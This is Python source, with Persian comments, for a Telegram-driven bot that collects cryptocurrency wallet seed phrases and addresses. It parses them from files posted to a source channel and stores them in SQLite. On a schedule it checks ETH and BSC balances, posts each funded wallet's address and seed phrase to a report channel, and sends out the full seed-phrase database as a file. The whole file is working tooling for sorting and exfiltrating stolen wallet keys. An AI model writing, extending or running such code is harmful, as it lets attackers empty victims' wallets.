import os
import re
import logging
import asyncio
import queue
import threading
import sqlite3
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request
from telegram import Bot, Update
from telegram.request import HTTPXRequest
from web3 import Web3

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = os.environ.get("BOT_TOKEN")
SOURCE_CHANNEL = -1003533610913
REPORT_CHANNEL = -1003893481541

# زمان‌بندی (دقیقه) - بعداً می‌تونی عوض کنی
HOURLY_INTERVAL_MIN = int(os.environ.get("HOURLY_INTERVAL_MIN", "60"))      # گزارش موجودی کل دیتابیس
EXPORT_INTERVAL_MIN = int(os.environ.get("EXPORT_INTERVAL_MIN", "120"))     # ارسال فایل دیتابیس

NETWORKS = {
    'ETH': 'https://eth.llamarpc.com',
    'BSC': 'https://bsc-dataseed.binance.org/',
}

DB_PATH = "wallets.db"
HOURLY_BATCH_SIZE = 300

app = Flask(__name__)
task_queue = queue.Queue()


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS wallets (
        address TEXT PRIMARY KEY, seed TEXT, added_at TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS meta (
        key TEXT PRIMARY KEY, value TEXT)''')
    conn.commit()
    conn.close()
    logging.info("Database ready")


def save_wallet(address, seed):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO wallets (address, seed, added_at) VALUES (?, ?, ?)",
              (address.lower(), seed.strip(), datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()


def get_all_wallets():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT address, seed FROM wallets ORDER BY added_at")
    rows = c.fetchall()
    conn.close()
    return rows


def get_meta(key, default=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT value FROM meta WHERE key = ?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default


def set_meta(key, value):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO meta (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()


def get_wallet_total(address):
    totals = {'ETH': 0.0, 'BSC': 0.0}
    for net, rpc in NETWORKS.items():
        try:
            w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={'timeout': 8}))
            checksum = Web3.to_checksum_address(address.strip())
            balance = w3.eth.get_balance(checksum)
            totals[net] = float(w3.from_wei(balance, 'ether'))
        except Exception:
            continue
    return totals


# ==================== فقط ذخیره فایل ====================
async def handle_file(doc):
    request_config = HTTPXRequest(connection_pool_size=20, pool_timeout=30.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    try:
        logging.info(f"[FILE] Saving: {doc.file_name}")

        file = await bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        pattern = r"Phrase:\s*(.+?)\s*\|\s*Addr:\s*(0x[a-fA-F0-9]{40})"
        matches = re.findall(pattern, text, re.IGNORECASE)

        if not matches:
            logging.info(f"[FILE] No wallets found in {doc.file_name}")
            return

        for phrase, addr in matches:
            save_wallet(addr, phrase)

        count = len(matches)
        total_in_db = len(get_all_wallets())
        logging.info(f"[FILE] Saved {count} wallets from {doc.file_name} | DB total: {total_in_db}")

        # فقط یک پیام ساده که ذخیره شد (اختیاری - اگر نخوای می‌تونم حذفش کنم)
        await bot.send_message(
            chat_id=REPORT_CHANNEL,
            text=f"💾 ذخیره شد: `{doc.file_name}`\n🔢 تعداد جدید: `{count}`\n📦 کل دیتابیس: `{total_in_db}`"
        )

    except Exception as e:
        logging.error(f"[FILE] Error: {e}", exc_info=True)


# ==================== گزارش ساعتی کل دیتابیس ====================
async def handle_hourly():
    request_config = HTTPXRequest(connection_pool_size=25, pool_timeout=60.0)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    wallets = get_all_wallets()
    if not wallets:
        logging.info("[HOURLY] No wallets")
        set_meta("last_hourly", datetime.utcnow().isoformat())
        return

    logging.info(f"[HOURLY] Start full scan: {len(wallets)} wallets")

    await bot.send_message(
        chat_id=REPORT_CHANNEL,
        text=f"⏰ **گزارش ساعتی کل دیتابیس**\n🔢 تعداد ولت: `{len(wallets)}`\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
    )

    totals = {'ETH': 0.0, 'BSC': 0.0}
    rich = []
    total_parts = (len(wallets) + HOURLY_BATCH_SIZE - 1) // HOURLY_BATCH_SIZE

    for i in range(0, len(wallets), HOURLY_BATCH_SIZE):
        batch = wallets[i:i + HOURLY_BATCH_SIZE]
        part_num = (i // HOURLY_BATCH_SIZE) + 1

        with ThreadPoolExecutor(max_workers=6) as executor:
            loop = asyncio.get_running_loop()
            tasks = [loop.run_in_executor(executor, get_wallet_total, addr) for addr, _ in batch]
            results = await asyncio.gather(*tasks)

        batch_totals = {'ETH': 0.0, 'BSC': 0.0}
        batch_rich = []
        for (addr, seed), res in zip(batch, results):
            batch_totals['ETH'] += res['ETH']
            batch_totals['BSC'] += res['BSC']
            totals['ETH'] += res['ETH']
            totals['BSC'] += res['BSC']
            if res['ETH'] + res['BSC'] > 0.00001:
                batch_rich.append({'address': addr, 'seed': seed, 'balances': res})
                rich.append({'address': addr, 'seed': seed, 'balances': res})

        # گزارش هر قسمت
        part_report = (
            f"⏰ **گزارش ساعتی** - قسمت {part_num}/{total_parts}\n"
            f"🔢 تعداد این قسمت: `{len(batch)}`\n"
            f"──────────────────\n"
            f"🔹 ETH: `{batch_totals['ETH']:.6f}`\n"
            f"🔹 BSC: `{batch_totals['BSC']:.6f}`\n"
            f"💰 دارای موجودی: `{len(batch_rich)}`"
        )
        await bot.send_message(chat_id=REPORT_CHANNEL, text=part_report, parse_mode='Markdown')

        for w in batch_rich:
            msg = f"`{w['address']}`\n🔑 `{w['seed']}`\n"
            if w['balances']['ETH'] > 0:
                msg += f"• ETH: `{w['balances']['ETH']:.6f}`\n"
            if w['balances']['BSC'] > 0:
                msg += f"• BSC: `{w['balances']['BSC']:.6f}`\n"
            await bot.send_message(chat_id=REPORT_CHANNEL, text=msg, parse_mode='Markdown')
            await asyncio.sleep(0.3)

        logging.info(f"[HOURLY] Part {part_num}/{total_parts} done")

    # گزارش نهایی
    final = (
        f"✅ **پایان گزارش ساعتی**\n"
        f"🔢 کل ولت: `{len(wallets)}`\n"
        f"🔹 ETH کل: `{totals['ETH']:.6f}`\n"
        f"🔹 BSC کل: `{totals['BSC']:.6f}`\n"
        f"💰 دارای موجودی: `{len(rich)}`"
    )
    await bot.send_message(chat_id=REPORT_CHANNEL, text=final, parse_mode='Markdown')

    set_meta("last_hourly", datetime.utcnow().isoformat())
    logging.info(f"[HOURLY] Finished | Rich: {len(rich)}")


# ==================== ارسال فایل دیتابیس ====================
async def handle_export():
    request_config = HTTPXRequest(connection_pool_size=10)
    bot = Bot(token=BOT_TOKEN, request=request_config)

    wallets = get_all_wallets()
    if not wallets:
        logging.info("[EXPORT] No wallets")
        set_meta("last_export", datetime.utcnow().isoformat())
        return

    content = f"Database Export - {datetime.utcnow().isoformat()} UTC\nTotal wallets: {len(wallets)}\n\n"
    for addr, seed in wallets:
        content += f"Phrase: {seed} | Addr: {addr}\n"

    with open("database_full.txt", "w", encoding="utf-8") as f:
        f.write(content)

    await bot.send_document(
        chat_id=REPORT_CHANNEL,
        document=open("database_full.txt", "rb"),
        caption=f"📦 فایل کامل دیتابیس\nتعداد: `{len(wallets)}`\n📅 `{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} UTC`"
    )
    set_meta("last_export", datetime.utcnow().isoformat())
    logging.info(f"[EXPORT] Sent {len(wallets)} wallets")


def worker():
    logging.info("Worker started")
    while True:
        try:
            task = task_queue.get()
            task_type = task.get("type")
            logging.info(f"Worker processing: {task_type}")

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            if task_type == "file":
                loop.run_until_complete(handle_file(task["doc"]))
            elif task_type == "hourly":
                loop.run_until_complete(handle_hourly())
            elif task_type == "export":
                loop.run_until_complete(handle_export())

            loop.close()
            task_queue.task_done()
        except Exception as e:
            logging.error(f"Worker error: {e}", exc_info=True)


def scheduler():
    logging.info("Scheduler started")
    while True:
        try:
            now = datetime.utcnow()

            last_hourly = get_meta("last_hourly")
            if last_hourly is None or (now - datetime.fromisoformat(last_hourly)).total_seconds() >= HOURLY_INTERVAL_MIN * 60:
                if task_queue.qsize() < 3:
                    task_queue.put({"type": "hourly"})
                    logging.info("Queued hourly")

            last_export = get_meta("last_export")
            if last_export is None or (now - datetime.fromisoformat(last_export)).total_seconds() >= EXPORT_INTERVAL_MIN * 60:
                if task_queue.qsize() < 3:
                    task_queue.put({"type": "export"})
                    logging.info("Queued export")

        except Exception as e:
            logging.error(f"Scheduler error: {e}")

        threading.Event().wait(30)


init_db()
threading.Thread(target=worker, daemon=True).start()
threading.Thread(target=scheduler, daemon=True).start()


@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json(force=True)
    update = Update.de_json(data, bot=None)

    if update and update.channel_post and update.channel_post.document:
        if update.channel_post.chat.id == SOURCE_CHANNEL:
            doc = update.channel_post.document
            logging.info(f"Webhook received: {doc.file_name}")
            task_queue.put({"type": "file", "doc": doc})

    return "OK"


@app.route('/')
def health():
    return f"Bot running | Queue: {task_queue.qsize()} | DB: {len(get_all_wallets())}"
